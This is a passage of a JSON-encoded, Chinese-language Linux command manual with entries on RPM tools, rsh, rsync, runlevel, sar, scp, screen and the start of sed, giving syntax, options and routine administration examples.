\u0027spec文件路径\u0027\n```\n\nbuild完后，可以在`/usr/src/redhat/RPMS/`下找到二进制rpm包，rpm包按照其对应的cpu体系结构分类，通常在`/usr/src/redhat/RPMS/i386`目录下。`/usr/src/redhat/SRPMS/`下找到源码rpm包，此时由于是源代码，所以无须按体系结构分类。\n\n\n"},{"name":"rpmdb","categoryId":0,"data":"rpmdb\n\u003d\u003d\u003d\n\n初始化和重建RPM数据库\n\n## 补充说明\n\n**rpmdb命令** 用于初始化和重建rpm数据库。\n\n### 语法  \n\n```\nrpmdb(选项)\n```\n\n### 选项  \n\n```\n--initdb：初始化RPM数据库；\n--rebuilddb：从已安装的包头文件，反向重建RPM数据库。\n```\n\n\n"},{"name":"rpmquery","categoryId":0,"data":"rpmquery\n\u003d\u003d\u003d\n\n从RPM数据库中查询软件包信息\n\n## 补充说明\n\n**rpmquery命令** 使用多种依据从rpm数据库中查询软件包信息。\n\n### 语法  \n\n```\nrpmquery(选项)\n```\n\n### 选项  \n\n```\n-qf：查询指定的文件所属的软件包；\n-q：查询指定的软件包是否被安装；\n-qc：查询软件包中的配置文件；\n-qd：查询软件包中的文档文件；\n-qi：查询软件包的基本信息。\n```\n\n### 实例  \n\n使用rpmquery命令查询指定文件所属的软件包：\n\n```\n[root@localhost ~]# rpmquery -qf /usr/bin/htpasswd\nhttpd-2.2.3-81.el5.centos\n```\n\n\n"},{"name":"rpmsign","categoryId":0,"data":"rpmsign\n\u003d\u003d\u003d\n\n使用RPM软件包的签名管理工具\n\n## 补充说明\n\n**rpmsign命令** 使用rpm软件包的签名管理工具。\n\n### 语法  \n\n```\nrpmsign(选项)\n```\n\n### 选项  \n\n```\n--addsign：为自动软件包添加签名；\n--checksig：验证软件包签名；\n--delsign：删除软件包签名；\n--import：导入公钥；\n--resign：重新签名软件包；\n--nodigest：不验证软件包摘要；\n--nosignature：不验证软件包签名。\n```\n\n\n"},{"name":"rpmverify","categoryId":0,"data":"rpmverify\n\u003d\u003d\u003d\n\n验证已安装的RPM软件包的正确性\n\n## 补充说明\n\n**rpmverify命令** 用来验证已安装的rpm软件包的正确性。\n\n### 语法  \n\n```\nrpmverify(选项)\n```\n\n### 选项  \n\n```\n-Va：验证所有软件包；\n-V\u003c软件包\u003ef：验证指定软件包；\n--nomd5：不验证软件包的md5摘要。\n```\n\n\n"},{"name":"rsh","categoryId":2,"data":"rsh\n\u003d\u003d\u003d\n\n连接远程主机并执行命令\n\n## 补充说明\n\n**rsh命令** 用于连接到远程的指定主机并执行指定的命令。\n\n### 语法  \n\n```\nrsh(选项)(参数)\n```\n\n### 选项  \n\n```\n-d：使用Socket层级的排错功能；\n-l\u003c用户名称\u003e：指定要登入远端主机的用户名称；\n-n：把输入的指令号向代号为/dev/null的特殊外围设备。\n```\n\n### 参数  \n\n*   远程主机：指定要连接的远程主机；\n*   指令：指定要在远程主机上执行的命令。\n\n\n"},{"name":"rsync","categoryId":0,"data":"rsync\n\u003d\u003d\u003d\n\n远程数据同步工具\n\n## 补充说明\n\n**rsync命令** 是一个远程数据同步工具，可通过LAN/WAN快速同步多台主机间的文件。rsync使用所谓的“rsync算法”来使本地和远程两个主机之间的文件达到同步，这个算法只传送两个文件的不同部分，而不是每次都整份传送，因此速度相当快。 rsync是一个功能非常强大的工具，其命令也有很多功能特色选项，我们下面就对它的选项一一进行分析说明。\n\n### 语法  \n\n```\nrsync [OPTION]... SRC DEST\nrsync [OPTION]... SRC [USER@]host:DEST\nrsync [OPTION]... [USER@]HOST:SRC DEST\nrsync [OPTION]... [USER@]HOST::SRC DEST\nrsync [OPTION]... SRC [USER@]HOST::DEST\nrsync [OPTION]... rsync://[USER@]HOST[:PORT]/SRC [DEST]\n```\n\n对应于以上六种命令格式，rsync有六种不同的工作模式：\n\n1.  拷贝本地文件。当SRC和DES路径信息都不包含有单个冒号\":\"分隔符时就启动这种工作模式。如：`rsync -a /data /backup`\n2.  使用一个远程shell程序(如rsh、ssh)来实现将本地机器的内容拷贝到远程机器。当DST路径地址包含单个冒号\":\"分隔符时启动该模式。如：`rsync -avz *.c foo:src`\n3.  使用一个远程shell程序(如rsh、ssh)来实现将远程机器的内容拷贝到本地机器。当SRC地址路径包含单个冒号\":\"分隔符时启动该模式。如：`rsync -avz foo:src/bar /data`\n4.  从远程rsync服务器中拷贝文件到本地机。当SRC路径信息包含\"::\"分隔符时启动该模式。如：`rsync -av root@192.168.78.192::www /databack`\n5.  从本地机器拷贝文件到远程rsync服务器中。当DST路径信息包含\"::\"分隔符时启动该模式。如：`rsync -av /databack root@192.168.78.192::www`\n6.  列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：`rsync -v rsync://192.168.78.192/www`\n\n### 选项  \n\n```\n-v, --verbose 详细模式输出。\n-q, --quiet 精简输出模式。\n-c, --checksum 打开校验开关，强制对文件传输进行校验。\n-a, --archive 归档模式，表示以递归方式传输文件，并保持所有文件属性，等于-rlptgoD。\n-r, --recursive 对子目录以递归模式处理。\n-R, --relative 使用相对路径信息。\n-b, --backup 创建备份，也就是对于目的已经存在有同样的文件名时，将老的文件重新命名为~filename。可以使用--suffix选项来指定不同的备份文件前缀。\n--backup-dir 将备份文件(如~filename)存放在在目录下。\n-suffix\u003dSUFFIX 定义备份文件前缀。\n-u, --update 仅仅进行更新，也就是跳过所有已经存在于DST，并且文件时间晚于要备份的文件，不覆盖更新的文件。\n-l, --links 保留软链结。\n-L, --copy-links 想对待常规文件一样处理软链结。\n--copy-unsafe-links 仅仅拷贝指向SRC路径目录树以外的链结。\n--safe-links 忽略指向SRC路径目录树以外的链结。\n-H, --hard-links 保留硬链结。\n-p, --perms 保持文件权限。\n-o, --owner 保持文件属主信息。\n-g, --group 保持文件属组信息。\n-D, --devices 保持设备文件信息。\n-t, --times 保持文件时间信息。\n-S, --sparse 对稀疏文件进行特殊处理以节省DST的空间。\n-n, --dry-run现实哪些文件将被传输。\n-w, --whole-file 拷贝文件，不进行增量检测。\n-x, --one-file-system 不要跨越文件系统边界。\n-B, --block-size\u003dSIZE 检验算法使用的块尺寸，默认是700字节。\n-e, --rsh\u003dcommand 指定使用rsh、ssh方式进行数据同步。\n--rsync-path\u003dPATH 指定远程服务器上的rsync命令所在路径信息。\n-C, --cvs-exclude 使用和CVS一样的方法自动忽略文件，用来排除那些不希望传输的文件。\n--existing 仅仅更新那些已经存在于DST的文件，而不备份那些新创建的文件。\n--delete 删除那些DST中SRC没有的文件。\n--delete-excluded 同样删除接收端那些被该选项指定排除的文件。\n--delete-after 传输结束以后再删除。\n--ignore-errors 及时出现IO错误也进行删除。\n--max-delete\u003dNUM 最多删除NUM个文件。\n--partial 保留那些因故没有完全传输的文件，以是加快随后的再次传输。\n--force 强制删除目录，即使不为空。\n--numeric-ids 不将数字的用户和组id匹配为用户名和组名。\n--timeout\u003dtime ip超时时间，单位为秒。\n-I, --ignore-times 不跳过那些有同样的时间和长度的文件。\n--size-only 当决定是否要备份文件时，仅仅察看文件大小而不考虑文件时间。\n--modify-window\u003dNUM 决定文件是否时间相同时使用的时间戳窗口，默认为0。\n-T --temp-dir\u003dDIR 在DIR中创建临时文件。\n--compare-dest\u003dDIR 同样比较DIR中的文件来决定是否需要备份。\n-P 等同于 --partial。\n--progress 显示备份过程。\n-z, --compress 对备份的文件在传输时进行压缩处理。\n--exclude\u003dPATTERN 指定排除不需要传输的文件模式。\n--include\u003dPATTERN 指定不排除而需要传输的文件模式。\n--exclude-from\u003dFILE 排除FILE中指定模式的文件。\n--include-from\u003dFILE 不排除FILE指定模式匹配的文件。\n--version 打印版本信息。\n--address 绑定到特定的地址。\n--config\u003dFILE 指定其他的配置文件，不使用默认的rsyncd.conf文件。\n--port\u003dPORT 指定其他的rsync服务端口。\n--blocking-io 对远程shell使用阻塞IO。\n-stats 给出某些文件的传输状态。\n--progress 在传输时现实传输过程。\n--log-format\u003dformAT 指定日志文件格式。\n--password-file\u003dFILE 从FILE中得到密码。\n--bwlimit\u003dKBPS 限制I/O带宽，KBytes per second。\n-h, --help 显示帮助信息。\n```\n\n### 实例  \n\n **SSH方式** \n\n首先在服务端启动ssh服务：\n\n```\nservice sshd start\n启动 sshd： [确定]\n```\n\n **使用rsync进行同步** \n\n接下来就可以在客户端使用rsync命令来备份服务端上的数据了，SSH方式是通过系统用户来进行备份的，如下：\n\n```\nrsync -vzrtopg --progress -e ssh --delete work@172.16.78.192:/www/* /databack/experiment/rsync\nwork@172.16.78.192\u0027s password:\nreceiving file list ...\n5 files to consider\ntest/\na\n0 100% 0.00kB/s 527:35:41 (1, 20.0% of 5)\nb\n67 100% 65.43kB/s 0:00:00 (2, 40.0% of 5)\nc\n0 100% 0.00kB/s 527:35:41 (3, 60.0% of 5)\ndd\n100663296 100% 42.22MB/s 0:00:02 (4, 80.0% of 5)\nsent 96 bytes received 98190 bytes 11563.06 bytes/sec\ntotal size is 100663363 speedup is 1024.19\n```\n\n上面的信息描述了整个的备份过程，以及总共备份数据的大小。\n\n **后台服务方式** \n\n启动rsync服务，编辑`/etc/xinetd.d/rsync`文件，将其中的`disable\u003dyes`改为`disable\u003dno`，并重启xinetd服务，如下：\n\n```\nvi /etc/xinetd.d/rsync\n\n#default: off\n# description: The rsync server is a good addition to an ftp server, as it \\\n# allows crc checksumming etc.\nservice rsync {\ndisable \u003d no\nsocket_type \u003d stream\nwait \u003d no\nuser \u003d root\nserver \u003d /usr/bin/rsync\nserver_args \u003d --daemon\nlog_on_failure +\u003d USERID\n}\n```\n\n```\n/etc/init.d/xinetd restart\n停止 xinetd： [确定]\n启动 xinetd： [确定]\n```\n\n创建配置文件，默认安装好rsync程序后，并不会自动创建rsync的主配置文件，需要手工来创建，其主配置文件为“/etc/rsyncd.conf”，创建该文件并插入如下内容：\n\n```\nvi /etc/rsyncd.conf\n\nuid\u003droot\ngid\u003droot\nmax connections\u003d4\nlog file\u003d/var/log/rsyncd.log\npid file\u003d/var/run/rsyncd.pid\nlock file\u003d/var/run/rsyncd.lock\nsecrets file\u003d/etc/rsyncd.passwd\nhosts deny\u003d172.16.78.0/22\n\n[www]\ncomment\u003d backup web\npath\u003d/www\nread only \u003d no\nexclude\u003dtest\nauth users\u003dwork\n```\n\n创建密码文件，采用这种方式不能使用系统用户对客户端进行认证，所以需要创建一个密码文件，其格式为“username:password”，用户名可以和密码可以随便定义，最好不要和系统帐户一致，同时要把创建的密码文件权限设置为600，这在前面的模块参数做了详细介绍。\n\n```\necho \"work:abc123\" \u003e /etc/rsyncd.passwd\nchmod 600 /etc/rsyncd.passwd\n```\n\n备份，完成以上工作，现在就可以对数据进行备份了，如下：\n\n```\nrsync -avz --progress --delete work@172.16.78.192::www /databack/experiment/rsync\n\nPassword:\nreceiving file list ...\n6 files to consider\n./ files...\na\n0 100% 0.00kB/s 528:20:41 (1, 50.0% of 6)\nb\n67 100% 65.43kB/s 0:00:00 (2, 66.7% of 6)\nc\n0 100% 0.00kB/s 528:20:41 (3, 83.3% of 6)\ndd\n100663296 100% 37.49MB/s 0:00:02 (4, 100.0% of 6)\nsent 172 bytes received 98276 bytes 17899.64 bytes/sec\ntotal size is 150995011 speedup is 1533.75\n```\n\n恢复，当服务器的数据出现问题时，那么这时就需要通过客户端的数据对服务端进行恢复，但前提是服务端允许客户端有写入权限，否则也不能在客户端直接对服务端进行恢复，使用rsync对数据进行恢复的方法如下：\n\n```\nrsync -avz --progress /databack/experiment/rsync/ work@172.16.78.192::www\n\nPassword:\nbuilding file list ...\n6 files to consider\n./\na\nb\n67 100% 0.00kB/s 0:00:00 (2, 66.7% of 6)\nc\nsent 258 bytes received 76 bytes 95.43 bytes/sec\ntotal size is 150995011 speedup is 452080.87\n```\n\n\n"},{"name":"runlevel","categoryId":0,"data":"runlevel\n\u003d\u003d\u003d\n\n打印当前Linux系统的运行等级\n\n## 补充说明\n\n**runlevel命令** 用于打印当前Linux系统的运行等级。\n\n### 语法  \n\n```\nrunlevel\n```\n\n### 知识扩展  \n\nlinux操作系统自从开始启动至启动完毕需要经历几个不同的阶段，这几个阶段就叫做runlevel，同样，当linux操作系统关闭时也要经历另外几个不同的runlevel，下面我们就准备详细介绍一下runlevel，并向您展示一些小技巧来让您的linux系统避免不必要的重启动。\n\nrunlevel可以认为是系统状态，形象一点，您可以认为runlevel有点象微软的windows操作系统中的Normal，safemode，和command prompt only。进入每个runlevel都需要启动或关闭相应的一系列服务(services)，这些服务(services)以初始化脚本的方式放置于目录`/etc/rc.d/rc?.d/`或者`/etc/rc?.d`下面（?代表runlevel的对应序号）。\n\n在大多数的linux发行版本中，通常有8个runlevel：\n\n```\n0 停机\n1 单用户模式\n2 多用户，没有 NFS\n3 完全多用户模式\n4 没有用到\n5 图形界面\n6 重新启动\nS s Single user mode\n```\n\n多数的桌面的linux系统缺省的runlevel是5，用户登陆时是图形界面，而多数的服务器版本的linux系统缺省的runlevel是3，用户登陆时是字符界面，runlevel 1和2除了调试之外很少使用，runlevel s和S并不是直接给用户使用，而是用来为Single user mode作准备。\n\nlinux的运行模式比起windows的启动模式的优势在于：你可以在系统空闲时使用init命令切换你现在使用的runlevel，另外，当你关闭或者启动linux系统时你已经不知不觉中切换你的runlevel，系统关机进程需要调用runlevel(0或6)来关闭所有正在运行中的进程。\n\n\n"},{"name":"sar","categoryId":0,"data":"sar\n\u003d\u003d\u003d\n\n系统运行状态统计工具\n\n## 补充说明\n\n**sar命令** 是Linux下系统运行状态统计工具，它将指定的操作系统状态计数器显示到标准输出设备。sar工具将对系统当前的状态进行取样，然后通过计算数据和比例来表达系统的当前运行状态。它的特点是可以连续对系统取样，获得大量的取样数据。取样数据和分析的结果都可以存入文件，使用它时消耗的系统资源很小。\n\n### 语法  \n\n```\nsar(选项)(参数)\n```\n\n### 选项  \n\n```\n-A：显示所有的报告信息；\n-b：显示I/O速率；\n-B：显示换页状态；\n-c：显示进程创建活动；\n-d：显示每个块设备的状态；\n-e：设置显示报告的结束时间；\n-f：从指定文件提取报告；\n-i：设状态信息刷新的间隔时间；\n-P：报告每个CPU的状态；\n-R：显示内存状态；\n-u：显示CPU利用率；\n-v：显示索引节点，文件和其他内核表的状态；\n-w：显示交换分区状态；\n-x：显示给定进程的状态。\n```\n\n### 参数  \n\n*   间隔时间：每次报告的间隔时间（秒）；\n*   次数：显示报告的次数。\n\n### 实例  \n\n **察看内存和交换空间的使用率：** \n\n```\nsar -r\nLinux 2.4.20-8 (www.jsdig.com)    20130503  \n12:00:01 AM kbmemfree kbmemused  %memused \nkbmemshrd kbbuffers  kbcached  \n12:10:00 AM    240468   1048252     81.34    \n0    133724    485772  \n12:20:00 AM    240508   1048212     81.34   \n0    134172    485600  \n…  \n08:40:00 PM    934132    354588     27.51    \n0     26080    185364  \nAverage:       324346    964374     74.83  \n0     96072    467559 \n```\n\nkbmemfree与kbmemused字段分别显示内存的未使用与已使用空间，后面跟着的是已使用空间的百分比（%memused字段）。kbbuffers与kbcached字段分别显示缓冲区与系统全域的数据存取量，单位为KB。\n\n **观察系统部件10分钟，并对数据进行排序：** \n\n```\nsar -o temp 60 10\n```\n\n\n"},{"name":"scp","categoryId":7,"data":"scp\n\u003d\u003d\u003d\n\n加密的方式在本地主机和远程主机之间复制文件\n\n## 补充说明\n\n**scp命令** 用于在Linux下进行远程拷贝文件的命令，和它类似的命令有cp，不过cp只是在本机进行拷贝不能跨服务器，而且scp传输是加密的。可能会稍微影响一下速度。当你服务器硬盘变为只读read only system时，用scp可以帮你把文件移出来。另外，scp还非常不占资源，不会提高多少系统负荷，在这一点上，rsync就远远不及它了。虽然 rsync比scp会快一点，但当小文件众多的情况下，rsync会导致硬盘I/O非常高，而scp基本不影响系统正常使用。\n\n### 语法  \n\n```\nscp(选项)(参数)\n```\n\n### 选项  \n\n```\n-1：使用ssh协议版本1；\n-2：使用ssh协议版本2；\n-4：使用ipv4；\n-6：使用ipv6；\n-B：以批处理模式运行；\n-C：使用压缩；\n-F：指定ssh配置文件；\n-l：指定宽带限制；\n-o：指定使用的ssh选项；\n-P：指定远程主机的端口号；\n-p：保留文件的最后修改时间，最后访问时间和权限模式；\n-q：不显示复制进度；\n-r：以递归方式复制。\n```\n\n### 参数  \n\n* 源文件：指定要复制的源文件。\n* 目标文件：目标文件。格式为`user@host：filename`（文件名为目标文件的名称）。\n\n### 实例  \n\n从远程复制到本地的scp命令与上面的命令雷同，只要将从本地复制到远程的命令后面2个参数互换顺序就行了。\n\n **从远处复制文件到本地目录** \n\n```\nscp root@10.10.10.10:/opt/soft/nginx-0.5.38.tar.gz /opt/soft/\n```\n\n从10.10.10.10机器上的`/opt/soft/`的目录中下载nginx-0.5.38.tar.gz 文件到本地`/opt/soft/`目录中。\n\n **从远处复制到本地** \n\n```\nscp -r root@10.10.10.10:/opt/soft/mongodb /opt/soft/\n```\n\n从10.10.10.10机器上的`/opt/soft/`中下载mongodb目录到本地的`/opt/soft/`目录来。\n\n **上传本地文件到远程机器指定目录** \n\n```\nscp /opt/soft/nginx-0.5.38.tar.gz root@10.10.10.10:/opt/soft/scptest\n```\n\n复制本地`/opt/soft/`目录下的文件nginx-0.5.38.tar.gz到远程机器10.10.10.10的`opt/soft/scptest`目录。\n\n **上传本地目录到远程机器指定目录** \n\n```\nscp -r /opt/soft/mongodb root@10.10.10.10:/opt/soft/scptest\n```\n\n上传本地目录`/opt/soft/mongodb`到远程机器10.10.10.10上`/opt/soft/scptest`的目录中去。\n\n\n"},{"name":"screen","categoryId":2,"data":"screen\n\u003d\u003d\u003d\n\n用于命令行终端切换\n\n## 补充说明\n\n**Screen** 是一款由GNU计划开发的用于命令行终端切换的自由软件。用户可以通过该软件同时连接多个本地或远程的命令行会话，并在其间自由切换。GNU Screen可以看作是窗口管理器的命令行界面版本。它提供了统一的管理多个会话的界面和相应的功能。\n\n **会话恢复** \n\n只要Screen本身没有终止，在其内部运行的会话都可以恢复。这一点对于远程登录的用户特别有用——即使网络连接中断，用户也不会失去对已经打开的命令行会话的控制。只要再次登录到主机上执行screen -r就可以恢复会话的运行。同样在暂时离开的时候，也可以执行分离命令detach，在保证里面的程序正常运行的情况下让Screen挂起（切换到后台）。这一点和图形界面下的VNC很相似。\n\n **多窗口** \n\n在Screen环境下，所有的会话都独立的运行，并拥有各自的编号、输入、输出和窗口缓存。用户可以通过快捷键在不同的窗口下切换，并可以自由的重定向各个窗口的输入和输出。Screen实现了基本的文本操作，如复制粘贴等；还提供了类似滚动条的功能，可以查看窗口状况的历史记录。窗口还可以被分区和命名，还可以监视后台窗口的活动。 会话共享 Screen可以让一个或多个用户从不同终端多次登录一个会话，并共享会话的所有特性（比如可以看到完全相同的输出）。它同时提供了窗口访问权限的机制，可以对窗口进行密码保护。\n\nGNU\u0027s Screen 官方站点：http://www.gnu.org/software/screen/\n\n### 语法  \n\n```\n# screen -AmRvx -[ls -wipe][-d \u003c作业名称\u003e][-h \u003c行数\u003e][-r \u003c作业名称\u003e][-s ][-S \u003c作业名称\u003e]\n```\n\n### 选项  \n\n```\n-A 　将所有的视窗都调整为目前终端机的大小。\n-d \u003c作业名称\u003e 　将指定的screen作业离线。\n-h \u003c行数\u003e 　指定视窗的缓冲区行数。\n-m 　即使目前已在作业中的screen作业，仍强制建立新的screen作业。\n-r \u003c作业名称\u003e 　恢复离线的screen作业。\n-R 　先试图恢复离线的作业。若找不到离线的作业，即建立新的screen作业。\n-s 　指定建立新视窗时，所要执行的shell。\n-S \u003c作业名称\u003e 　指定screen作业的名称。\n-v 　显示版本信息。\n-x 　恢复之前离线的screen作业。\n-ls或--list 　显示目前所有的screen作业。\n-wipe 　检查目前所有的screen作业，并删除已经无法使用的screen作业。\n```\n\n### 常用screen参数  \n\n```\nscreen -S yourname -\u003e 新建一个叫yourname的session\nscreen -ls -\u003e 列出当前所有的session\nscreen -r yourname -\u003e 回到yourname这个session\nscreen -d yourname -\u003e 远程detach某个session\nscreen -d -r yourname -\u003e 结束当前session并回到yourname这个session\n```\n\n在每个screen session 下，所有命令都以 ctrl+a(C-a) 开始。\n\n```\nC-a ? -\u003e 显示所有键绑定信息\nC-a c -\u003e 创建一个新的运行shell的窗口并切换到该窗口\nC-a n -\u003e Next，切换到下一个 window \nC-a p -\u003e Previous，切换到前一个 window \nC-a 0..9 -\u003e 切换到第 0..9 个 window\nCtrl+a [Space] -\u003e 由视窗0循序切换到视窗9\nC-a C-a -\u003e 在两个最近使用的 window 间切换 \nC-a x -\u003e 锁住当前的 window，需用用户密码解锁\nC-a d -\u003e detach，暂时离开当前session，将目前的 screen session (可能含有多个 windows) 丢到后台执行，并会回到还没进 screen 时的状态，此时在 screen session 里，每个 window 内运行的 process (无论是前台/后台)都在继续执行，即使 logout 也不影响。 \nC-a z -\u003e 把当前session放到后台执行，用 shell 的 fg 命令则可回去。\nC-a w -\u003e 显示所有窗口列表\nC-a t -\u003e time，显示当前时间，和系统的 load \nC-a k -\u003e kill window，强行关闭当前的 window\nC-a  -\u003e 进入 copy mode，在 copy mode 下可以回滚、搜索、复制就像用使用 [vi 一样\n    C-b Backward，PageUp \n    C-f Forward，PageDown \n    H(大写) High，将光标移至左上角 \n    L Low，将光标移至左下角 \n    0 移到行首 \n    $ 行末 \n    w forward one word，以字为单位往前移 \n    b backward one word，以字为单位往后移 \n    Space 第一次按为标记区起点，第二次按为终点 \n    Esc 结束 copy mode \nC-a ] -\u003e paste，把刚刚在 copy mode 选定的内容贴上\n```\n\n### 使用 screen  \n\n **安装screen** \n\n流行的Linux发行版（例如Red Hat Enterprise Linux）通常会自带screen实用程序，如果没有的话，可以从GNU screen的官方网站下载。\n\n```\n[root@TS-DEV ~]# yum install screen\n[root@TS-DEV ~]# rpm -qa|grep screen\nscreen-4.0.3-4.el5\n[root@TS-DEV ~]#\n```\n\n **创建一个新的窗口** \n\n安装完成后，直接敲命令screen就可以启动它。但是这样启动的screen会话没有名字，实践上推荐为每个screen会话取一个名字，方便分辨：\n\n```\n[root@TS-DEV ~]# screen -S david \n```\n\nscreen启动后，会创建第一个窗口，也就是窗口No. 0，并在其中打开一个系统默认的shell，一般都会是bash。所以你敲入命令screen之后，会立刻又返回到命令提示符，仿佛什么也没有发生似的，其实你已经进入Screen的世界了。当然，也可以在screen命令之后加入你喜欢的参数，使之直接打开你指定的程序，例如：\n\n```\n[root@TS-DEV ~]# screen vi david.txt\n```\n\nscreen创建一个执行vi david.txt的单窗口会话，退出vi 将退出该窗口/会话。\n\n **查看窗口和窗口名称** \n\n打开多个窗口后，可以使用快捷键C-a w列出当前所有窗口。如果使用文本终端，这个列表会列在屏幕左下角，如果使用X环境下的终端模拟器，这个列表会列在标题栏里。窗口列表的样子一般是这样：\n\n```\n0$ bash  1-$ bash  2*$ bash  \n```\n\n这个例子中我开启了三个窗口，其中*号表示当前位于窗口2，-号表示上一次切换窗口时位于窗口1。\n\nScreen默认会为窗口命名为编号和窗口中运行程序名的组合，上面的例子中窗口都是默认名字。练习了上面查看窗口的方法，你可能就希望各个窗口可以有不同的名字以方便区分了。可以使用快捷键C-a A来为当前窗口重命名，按下快捷键后，Screen会允许你为当前窗口输入新的名字，回车确认。\n\n **会话分离与恢复** \n\n你可以不中断screen窗口中程序的运行而暂时断开（detach）screen会话，并在随后时间重新连接（attach）该会话，重新控制各窗口中运行的程序。例如，我们打开一个screen窗口编辑/tmp/david.txt文件：\n\n```\n[root@TS-DEV ~]# screen vi /tmp/david.txt\n```\n\n之后我们想暂时退出做点别的事情，比如出去散散步，那么在screen窗口键入C-a d，Screen会给出detached提示：\n\n暂时中断会话\n\n!\n\n半个小时之后回来了，找到该screen会话：\n\n```\n[root@TS-DEV ~]# screen -ls\n```\n\n!\n\n重新连接会话：\n\n```\n[root@TS-DEV ~]# screen -r 12865\n```\n\n一切都在。\n\n当然，如果你在另一台机器上没有分离一个Screen会话，就无从恢复会话了。这时可以使用下面命令强制将这个会话从它所在的终端分离，转移到新的终端上来：\n\n!\n\n **清除dead 会话** \n\n如果由于某种原因其中一个会话死掉了（例如人为杀掉该会话），这时screen -list会显示该会话为dead状态。使用screen -wipe命令清除该会话：\n\n!\n\n **关闭或杀死窗口** \n\n正常情况下，当你退出一个窗口中最后一个程序（通常是bash）后，这个窗口就关闭了。另一个关闭窗口的方法是使用C-a k，这个快捷键杀死当前的窗口，同时也将杀死这个窗口中正在运行的进程。\n\n如果一个Screen会话中最后一个窗口被关闭了，那么整个Screen会话也就退出了，screen进程会被终止。\n\n除了依次退出/杀死当前Screen会话中所有窗口这种方法之外，还可以使用快捷键C-a :，然后输入quit命令退出Screen会话。需要注意的是，这样退出会杀死所有窗口并退出其中运行的所有程序。其实C-a :这个快捷键允许用户直接输入的命令有很多，包括分屏可以输入split等，这也是实现Screen功能的一个途径，不过个人认为还是快捷键比较方便些。\n\n### screen 高级应用   \n\n **会话共享** \n\n还有一种比较好玩的会话恢复，可以实现会话共享。假设你在和朋友在不同地点以相同用户登录一台机器，然后你创建一个screen会话，你朋友可以在他的终端上命令：\n\n```\n[root@TS-DEV ~]# screen -x\n```\n\n这个命令会将你朋友的终端Attach到你的Screen会话上，并且你的终端不会被Detach。这样你就可以和朋友共享同一个会话了，如果你们当前又处于同一个窗口，那就相当于坐在同一个显示器前面，你的操作会同步演示给你朋友，你朋友的操作也会同步演示给你。当然，如果你们切换到这个会话的不同窗口中去，那还是可以分别进行不同的操作的。\n\n **会话锁定与解锁** \n\nScreen允许使用快捷键C-a s锁定会话。锁定以后，再进行任何输入屏幕都不会再有反应了。但是要注意虽然屏幕上看不到反应，但你的输入都会被Screen中的进程接收到。快捷键C-a q可以解锁一个会话。\n\n也可以使用C-a x锁定会话，不同的是这样锁定之后，会话会被Screen所属用户的密码保护，需要输入密码才能继续访问这个会话。\n\n **发送命令到screen会话** \n\n在Screen会话之外，可以通过screen命令操作一个Screen会话，这也为使用Screen作为脚本程序增加了便利。关于Screen在脚本中的应用超出了入门的范围，这里只看一个例子，体会一下在会话之外对Screen的操作：\n\n```\n[root@TS-DEV ~]# screen -S sandy -X screen ping www.baidu.com\n```\n\n这个命令在一个叫做sandy的screen会话中创建一个新窗口，并在其中运行ping命令。\n\n **屏幕分割** \n\n现在显示器那么大，将一个屏幕分割成不同区域显示不同的Screen窗口显然是个很酷的事情。可以使用快捷键C-a S将显示器水平分割，Screen 4.00.03版本以后，也支持垂直分屏，快捷键是C-a |。分屏以后，可以使用C-a \u003ctab\u003e在各个区块间切换，每一区块上都可以创建窗口并在其中运行进程。\n\n可以用C-a X快捷键关闭当前焦点所在的屏幕区块，也可以用C-a Q关闭除当前区块之外其他的所有区块。关闭的区块中的窗口并不会关闭，还可以通过窗口切换找到它。\n\n!\n\n **C/P模式和操作** \n\nscreen的另一个很强大的功能就是可以在不同窗口之间进行复制粘贴了。使用快捷键C-a \u003cEsc\u003e或者C-a [可以进入copy/paste模式，这个模式下可以像在vi中一样移动光标，并可以使用空格键设置标记。其实在这个模式下有很多类似vi的操作，譬如使用/进行搜索，使用y快速标记一行，使用w快速标记一个单词等。关于C/P模式下的高级操作，其文档的这一部分有比较详细的说明。\n\n一般情况下，可以移动光标到指定位置，按下空格设置一个开头标记，然后移动光标到结尾位置，按下空格设置第二个标记，同时会将两个标记之间的部分储存在copy/paste buffer中，并退出copy/paste模式。在正常模式下，可以使用快捷键C-a ]将储存在buffer中的内容粘贴到当前窗口。\n\n!\n\n **更多screen功能** \n\n同大多数UNIX程序一样，GNU Screen提供了丰富强大的定制功能。你可以在Screen的默认两级配置文件/etc/screenrc和$HOME/.screenrc中指定更多，例如设定screen选项，定制绑定键，设定screen会话自启动窗口，启用多用户模式，定制用户访问权限控制等等。如果你愿意的话，也可以自己指定screen配置文件。\n\n以多用户功能为例，screen默认是以单用户模式运行的，你需要在配置文件中指定multiuser on 来打开多用户模式，通过acl*（acladd,acldel,aclchg...）命令，你可以灵活配置其他用户访问你的screen会话。更多配置文件内容请参考screen的man页。\n\n\n"},{"name":"sed","categoryId":1,"data":"sed\n\u003d\u003d\u003d\n\n功能强大的流式文本编辑器\n\n## 补充说明\n\n**sed** 是一种流编辑器，它是文本处理中非常中的工具，能够完美的配合正则表达式使用，功能不同凡响。处理时，把当前处理的行存储在临时缓冲区中，称为“模式空间”（pattern space），接着用sed命令处理缓冲区中的内容，处理完成后，把缓冲区的内容送往屏幕。接着处理下一行，这样不断重复，直到文件末尾。文件内容并没有 改变，除非你使用重定向存储输出。Sed主要用来自动编辑一个或多个文件；简化对文件的反复操作；编写转换程序等。\n\n## sed的选项、命令、替换标记  \n\n **命令格式** \n\n```\nsed [options] \u0027command\u0027 file(s)\nsed [options] -f scriptfile file(s)\n```\n\n### 选项  \n\n```\n-e\u003cscript\u003e或--expression\u003d\u003cscript\u003e：以选项中的指定的script来处理输入的文本文件；\n-f\u003cscript文件\u003e或--file\u003d\u003cscript文件\u003e：以选项中指定的script文件来处理输入的文本文件；\n-h或--help：显示帮助；\n-n或--quiet或——silent：仅显示script处理后的结果；\n-V或--version：显示版本信息。\n```\n\n### 参数  \n\n文件：指定待处理的文本文件列表。\n\n### sed命令  \n\n```\n **a\\**  在当前行下面插入文本。\n **i\\**  在当前行上面插入文本。\n **c\\**  把选定的行改为新的文本。\n **d**  删除，删除选择的行。\n **D**  删除模板块的第一行。\n **s**  替换指定字符\n **h**  拷贝模板块的内容到内存中的缓冲区。\n **H**  追加模板块的内容到内存中的缓冲区。\n **g**  获得内存缓冲区的内容，并替代当前模板块中的文本。\n **G**  获得内存缓冲区的内容，并追加到当前模板块文本的后面。\n **l**  列表不能打印字符的清单。\n **n**  读取下一个输入行，用下一个命令处理新的行而不是用第一个命令。\n **N**  追加下一个输入行到模板块后面并在二者间嵌入一个新行，改变当前行号码。\n **p**  打印模板块的行。\n **P** (大写) 